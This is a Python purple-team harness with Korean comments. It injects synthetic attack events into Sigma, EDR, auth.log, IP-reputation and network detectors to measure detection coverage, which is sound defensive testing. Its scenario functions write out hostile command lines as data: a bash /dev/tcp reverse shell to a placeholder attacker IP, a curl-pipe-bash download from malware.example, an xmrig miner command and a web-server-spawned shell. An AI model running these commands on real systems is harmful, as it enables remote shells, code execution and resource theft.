"""
퍼플팀 공격 시뮬레이션 하네스 — 탐지 검증

안전한 모의 공격 시나리오를 실제 탐지 모듈에 주입해, 구축한 탐지 파이프라인
(Sigma / EDR / auth.log / IP평판 / 네트워크 / SOAR / 알림)이 실제로 탐지하는지
자동 검증한다. 탐지되면 PASS, 놓치면 FAIL → 탐지 커버리지(%)로 요약.

안전장치:
  - 실제 공격을 수행하지 않음. 합성 이벤트를 탐지 엔진에 '주입'만 한다.
  - 출발지 IP는 문서용 TEST-NET(RFC5737: 203.0.113.x / 198.51.100.x)만 사용해
    실제 자산이 차단/영향받지 않게 한다.
  - 프로세스는 존재하지 않는 가짜 PID/명령을 사용(실제 종료 대상 아님).

각 시나리오는 실제 탐지 로직을 호출하므로, 룰/임계값을 바꾸면 그 결과가
곧바로 커버리지에 반영된다(탐지 회귀 테스트 역할).
"""
import threading
from datetime import datetime
from collections import deque

from modules.logging_setup import get_logger

_log = get_logger(__name__)


# 문서용 TEST-NET (RFC5737) — 실제 라우팅되지 않는 안전한 가짜 공격자 IP
ATTACKER_IP = "203.0.113.66"
ATTACKER_IP2 = "198.51.100.23"
# ip_reputation 데모에서 100점으로 취급되는 알려진 악성 IP(모의)
KNOWN_BAD_IP = "45.155.205.233"


class PurpleTeam:
    def __init__(self, socketio, config=None, sigma=None, edr=None, authlog=None,
                 ip_reputation=None, net_monitor=None, threat_detector=None):
        self.socketio = socketio
        self.config = config or {}
        self.sigma = sigma
        self.edr = edr
        self.authlog = authlog
        self.ip_reputation = ip_reputation
        self.net_monitor = net_monitor
        self.threat_detector = threat_detector
        self._lock = threading.Lock()

        self.results = {}        # scenario_id -> 최근 결과
        self.history = deque(maxlen=50)   # 실행(run) 요약 이력
        self._run_id = 0
        self.stats = {"runs": 0, "last_run": None,
                      "last_coverage": None, "scenarios": 0}

        self.scenarios = [
            {"id": "revshell", "name": "리버스 셸 (bash /dev/tcp)",
             "mitre": "T1059.004", "expect": "Sigma/EDR", "fn": self._sc_revshell},
            {"id": "webshell", "name": "웹셸 (웹서버가 셸 스폰)",
             "mitre": "T1505.003", "expect": "Sigma/EDR", "fn": self._sc_webshell},
            {"id": "miner", "name": "크립토 마이너 (xmrig)",
             "mitre": "T1496", "expect": "Sigma/EDR", "fn": self._sc_miner},
            {"id": "scanner", "name": "네트워크 스캐너 (nmap)",
             "mitre": "T1046", "expect": "Sigma/EDR", "fn": self._sc_scanner},
            {"id": "download_exec", "name": "다운로드-실행 (curl|bash)",
             "mitre": "T1105", "expect": "Sigma", "fn": self._sc_download_exec},
            {"id": "brute", "name": "SSH 무차별 대입",
             "mitre": "T1110", "expect": "auth.log→BRUTE_FORCE", "fn": self._sc_brute},
            {"id": "malicious_ip", "name": "악성 IP 아웃바운드 통신",
             "mitre": "T1071", "expect": "IP평판/네트워크", "fn": self._sc_malicious_ip},
        ]
        self.stats["scenarios"] = len(self.scenarios)

    # ------------------------------------------------------------------ #

    def start(self, demo=True):
        _log.info(f"[Purple] 퍼플팀 하네스 준비 — 시나리오 {len(self.scenarios)}개 "
              f"(TEST-NET IP만 사용, 실제 공격 없음)")

    def stop(self):
        pass

    def get_status(self):
        with self._lock:
            return {
                "stats": dict(self.stats),
                "scenarios": [
                    {"id": s["id"], "name": s["name"], "mitre": s["mitre"],
                     "expect": s["expect"], "result": self.results.get(s["id"])}
                    for s in self.scenarios
                ],
                "history": list(reversed(list(self.history)))[:20],
            }

    # ------------------------------------------------------------------ #
    #  실행
    # ------------------------------------------------------------------ #

    def run_scenario(self, scenario_id):
        sc = next((s for s in self.scenarios if s["id"] == scenario_id), None)
        if not sc:
            return {"error": "알 수 없는 시나리오"}
        return self._execute(sc)

    def run_all(self):
        results = [self._execute(sc) for sc in self.scenarios]
        detected = sum(1 for r in results if r["detected"])
        coverage = round(detected / len(results) * 100, 1) if results else 0
        with self._lock:
            self._run_id += 1
            summary = {
                "run_id": self._run_id,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "total": len(results), "detected": detected,
                "coverage": coverage,
                "failed": [r["name"] for r in results if not r["detected"]],
            }
            self.history.append(summary)
            self.stats["runs"] += 1
            self.stats["last_run"] = summary["timestamp"]
            self.stats["last_coverage"] = coverage
        try:
            self.socketio.emit("purple_run", summary)
        except Exception:
            pass
        return {"summary": summary, "results": results}

    def _execute(self, sc):
        try:
            detected, detail, detector = sc["fn"]()
        except Exception as e:
            detected, detail, detector = False, f"실행 오류: {type(e).__name__}: {e}", "-"
        result = {
            "id": sc["id"], "name": sc["name"], "mitre": sc["mitre"],
            "expect": sc["expect"], "detected": bool(detected),
            "detector": detector, "detail": detail,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        with self._lock:
            self.results[sc["id"]] = result
        try:
            self.socketio.emit("purple_result", result)
        except Exception:
            pass
        return result

    # ------------------------------------------------------------------ #
    #  시나리오 (합성 이벤트를 실제 탐지 엔진에 주입 → 결과 검증)
    # ------------------------------------------------------------------ #

    def _proc(self, **kw):
        base = {"pid": 990000 + len(kw), "name": "?", "parent": "?",
                "user": "www-data", "cmdline": "", "exe_path": "", "cpu": 0.0}
        base.update(kw)
        return base

    def _check_process(self, proc):
        """프로세스를 Sigma(파이프라인 포함) + EDR 로직에 넣고 탐지 여부 반환."""
        matches = []
        if self.sigma:
            matches = self.sigma.feed_process(proc)   # 매치시 파이프라인/알림까지 발동
        risk = 0
        if self.edr:
            risk, _ioas = self.edr._evaluate(proc)
        detected = bool(matches) or risk >= 70
        detail = f"Sigma {len(matches)}룰 매치 · EDR 위험점수 {risk}"
        return detected, detail, "Sigma+EDR"

    def _sc_revshell(self):
        return self._check_process(self._proc(
            name="bash", parent="nginx", exe_path="/bin/bash",
            cmdline=f"bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1"))

    def _sc_webshell(self):
        return self._check_process(self._proc(
            name="sh", parent="apache2", exe_path="/bin/sh", cmdline="sh -c id"))

    def _sc_miner(self):
        return self._check_process(self._proc(
            name="xmrig", parent="systemd", user="nobody", exe_path="/tmp/.x/xmrig",
            cmdline="/tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet", cpu=97.0))

    def _sc_scanner(self):
        return self._check_process(self._proc(
            name="nmap", parent="bash", user="mintkangaroo", exe_path="/usr/bin/nmap",
            cmdline="nmap -sS 192.168.1.0/24"))

    def _sc_download_exec(self):
        return self._check_process(self._proc(
            name="sh", parent="bash", exe_path="/bin/sh",
            cmdline="curl http://malware.example/x.sh | bash"))

    def _sc_brute(self):
        """auth.log 실패 라인을 임계값 이상 주입 → BRUTE_FORCE 탐지 확인."""
        if not self.authlog:
            return False, "authlog 모듈 없음", "-"
        before = self.authlog.stats.get("brute_alerts", 0)
        base = self.threat_detector.get_stats().get("total_alerts", 0) if self.threat_detector else 0
        # 임계값보다 넉넉히 주입 (기본 5회/120초)
        for i in range(8):
            line = (f"Jul 15 21:0{i}:00 host sshd[{1000+i}]: "
                    f"Failed password for root from {ATTACKER_IP} port {40000+i} ssh2")
            self.authlog._process_line(line)
        after = self.authlog.stats.get("brute_alerts", 0)
        after_alerts = self.threat_detector.get_stats().get("total_alerts", 0) if self.threat_detector else 0
        detected = after > before or after_alerts > base
        return detected, (f"브루트포스 알림 {before}→{after}, "
                          f"파이프라인 알림 +{after_alerts - base}"), "auth.log"

    def _sc_malicious_ip(self):
        """악성 IP 아웃바운드 연결 → IP평판 + 네트워크 관제 탐지 확인."""
        detectors, detected = [], False
        score = None
        if self.ip_reputation:
            rep = self.ip_reputation.check(KNOWN_BAD_IP, force=True)
            score = rep.get("score", 0)
            if score >= getattr(self.ip_reputation, "min_score", 75):
                detected = True
                detectors.append("IP평판")
        if self.net_monitor:
            before = self.net_monitor.stats.get("malicious_conns", 0)
            self.net_monitor._alerted_ips.discard(KNOWN_BAD_IP)
            self.net_monitor._finalize(
                [{"laddr": "10.0.0.9:44100", "raddr": f"{KNOWN_BAD_IP}:4444",
                  "rip": KNOWN_BAD_IP, "status": "ESTABLISHED", "proc": "bash",
                  "external": True}], [], {KNOWN_BAD_IP})
            if self.net_monitor.stats.get("malicious_conns", 0) > before:
                detected = True
                detectors.append("네트워크관제")
        detail = f"평판점수 {score}, 탐지기: {', '.join(detectors) or '없음'}"
        return detected, detail, "+".join(detectors) or "IP평판/네트워크"
